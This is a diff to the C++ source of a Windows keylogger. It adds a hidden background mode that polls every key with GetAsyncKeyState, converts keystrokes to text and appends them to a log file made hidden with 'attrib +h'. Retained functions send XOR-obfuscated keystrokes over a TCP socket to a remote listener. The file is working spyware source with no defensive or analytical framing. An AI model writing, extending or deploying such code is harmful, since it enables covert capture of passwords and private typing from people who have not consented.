@@ -2,6 +2,7 @@
 #include "../inc/Keylogger.h"
 #include "../inc/other.h"
 
+
 Keylogger::Keylogger()
 {
     ;
@@ -162,11 +163,10 @@ wstring Keylogger::intToUnicode(INT keystroke)
 {
     BYTE kState[256]={0};
     WCHAR uni_key[16]={0};
-
-    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.
-
     UINT virtual_key = keystroke;
 
+    GetKeyboardState(kState); //Copie l'état des 256 clés virtuelles dans le tampon spécifié.
+    
     ToUnicodeEx(virtual_key, keystroke, kState, uni_key, 32, 0, a_hkl);
 
     return (wstring) uni_key;
@@ -186,20 +186,151 @@ VOID Keylogger::directTcp()
     
     WaitForSingleObject(threads[1], INFINITE);
     
-    wcout << "TerminateThread" << TerminateThread(threads[0], 0) << endl; //Once the first thread is finished, finish the second. 
+    TerminateThread(threads[0], 0); //Once the first thread is finished, finish the second. 
 
     CloseHandle(threads[0]);
     CloseHandle(threads[1]);
-    wcout << "finish ? " << endl;
+}
+
+
+//-------------------------------------------------------------------------------------------------------------------
+INT Keylogger::silenciousBackground()//return 1 if error
+{
+    /*
+    Algo:
+    1- (createHideFileAndHideFile)
+        1.1- Test if exist.
+        1.2- Set handle of the a_file_name.
+        1.3- Hide a_file_name.
+    2- (StaticThreadStart) Start thread.
+        2.1- (keyboardListeningAndWriteFile)
+        2.2- (writeKeystrokeInFile)
+    */
+   if(createHideFileAndHideFile())
+   {
+       //if error
+        return 1;
+   }
+    HANDLE hThread  = CreateThread(NULL,0 ,silenciousThread ,this ,0 ,NULL);
+    WaitForSingleObject(hThread, INFINITE); //just for test
+    
+    return 0;
+}
+
+
+DWORD WINAPI Keylogger::silenciousThread(LPVOID param) //https://stackoverflow.com/questions/1372967/how-do-you-use-createthread-for-functions-which-are-class-members
+{
+    Keylogger* This = (Keylogger *) param;
+    //setup ?????
+    wcout << "Handler in staticThreadStart: " << This->a_hFile << endl;
+    This->keyboardListeningAndWriteFile(This->a_hFile);
+
+    return 0;
+}
+
+
+VOID Keylogger::keyboardListeningAndWriteFile(CONST HANDLE &hFile)
+{
+    wcout << "Handle keyboardListeningAndWriteFile: " <<hFile << endl;
+    wstring unicode_char;
+
+    while(TRUE)
+    {  
+        for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
+        {
+            if(GetAsyncKeyState(keystroke) == -32767)
+            {
+                //if press key
+                cout << keystroke << endl;
+                if((keystroke>=39)&&(keystroke<91))
+                {
+                    //not SpecialKey
+                    unicode_char = intToUnicode(keystroke);
+                }
+                else
+                {
+                    unicode_char = specialKey(keystroke);
+                }
+                wcout << "char: "<<unicode_char << endl;
+
+                //writeKeystrokeInFile(XOREncryption(unicode_char), hFile);
+                writeKeystrokeInFile(unicode_char, hFile);
+            }
+        }
+    }
+}
+
+
+INT Keylogger::createHideFileAndHideFile() //return 1 if error
+{
+    HANDLE hFile; //use in CreateFile and WriteFile
+    BOOL status; // use in WriteFile
+    DWORD dwBytesWritten = 0; // use in WriteFile
+    DWORD dwDesiredAccess;
+    DWORD dwCreationDisposition; //use in CreateFilW
+   
+    if(checkIfFileExist((wstring)a_file_name))
+    {
+        //if exist
+        wcout << "[+] file exist.\n" << endl;
+        dwDesiredAccess = FILE_APPEND_DATA; // Automatically seek to the end of the file after creating/opening
+        dwCreationDisposition = OPEN_ALWAYS; // Opens a file, always.
+    }
+    else
+    {
+        //file not exist
+        wcout << "[-] File not  exist" << endl;
+        dwDesiredAccess = GENERIC_WRITE;
+        dwCreationDisposition = CREATE_NEW;
+    }
+
+    hFile = CreateFileW(a_file_name,  dwDesiredAccess,  0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL); //Crée ou ouvre un fichier ou un périphérique d'E / S. 
+    wcout << "last error createfile: " << GetLastError() << endl;
+    wcout << "CreateFile hFile: " << hFile << endl; 
+    if(hFile == INVALID_HANDLE_VALUE)
+    {
+        //fatal error
+        wcout << "FATAL ERROR in createHideFileAndHideFile" << endl;
+        return 1;
+    }
+    else
+    {
+        wstring cmd = L"attrib +h " + (wstring)a_file_name; 
+        wcout << "cmd: " << cmd << endl;
+        _wsystem(cmd.c_str());
+        wcout << "[?] File hide !!!" << endl;
+        
+        a_hFile = hFile; //set attribut
+        return 0;
+    }
+}
+
+
+VOID Keylogger::writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile)
+{
+    WriteFile(          //https://stackoverflow.com/questions/28618715/c-writefile-unicode-characters
+        hFile,           // open file handle
+        ConvertWideToUtf8(keystroke).c_str(), // start of data to write
+        keystroke.length(),  // number of bytes to write
+        NULL, // number of bytes that were written
+        NULL);           // no overlapped structure
+    wcout << "write file good or not ? "<< GetLastError() << endl;
+}
+
+
+//-------------------------------------------------------------------------------------------------------------------
+HANDLE Keylogger::gethFile()
+{
+    return a_hFile;
 }
 
 
 Keylogger::~Keylogger()
-{;}
+{wcout << "\n\nDestructorrrrrr\n\n" << endl;}
 
 
 //----------------------------------------------------------------------------------
-DWORD WINAPI sendKeystrokeThread(LPVOID param)
+DWORD WINAPI sendKeystrokeThread(LPVOID param) //for directTcp
 {   
     SOCKET sock = *(SOCKET *)param;
     wstring unicode_char;
@@ -210,7 +341,7 @@ DWORD WINAPI sendKeystrokeThread(LPVOID param)
     while (true)
     {
         Sleep(20);
-
+    
         for(INT keystroke=8; keystroke <= 222; keystroke++) //Test toute les touche
         {
             if(GetAsyncKeyState(keystroke) == -32767)
@@ -225,17 +356,17 @@ DWORD WINAPI sendKeystrokeThread(LPVOID param)
                 {
                     unicode_char = keylogger.specialKey(keystroke);
                 }
-                wcout << "send char: "<<unicode_char << endl;
-                send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
+                wcout << "char: "<<unicode_char << endl;
             }
+            wcout << "send char: "<<unicode_char << endl;
+            send(sock, (char *)XOREncryption(unicode_char).c_str(),unicode_char.length() * sizeof(WCHAR), 0);
         }
     }
-
     return 0;
 }
 
 
-DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp
+DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection message  for directTcp | for directTcp
 {
     SOCKET sock = *(SOCKET *)param;
 
@@ -261,3 +392,4 @@ DWORD WINAPI recvDataThread(LPVOID param)//waits to receive an end-of-connection
     wcout << "stop thread baby !" << endl;
     return 0;
 }
+
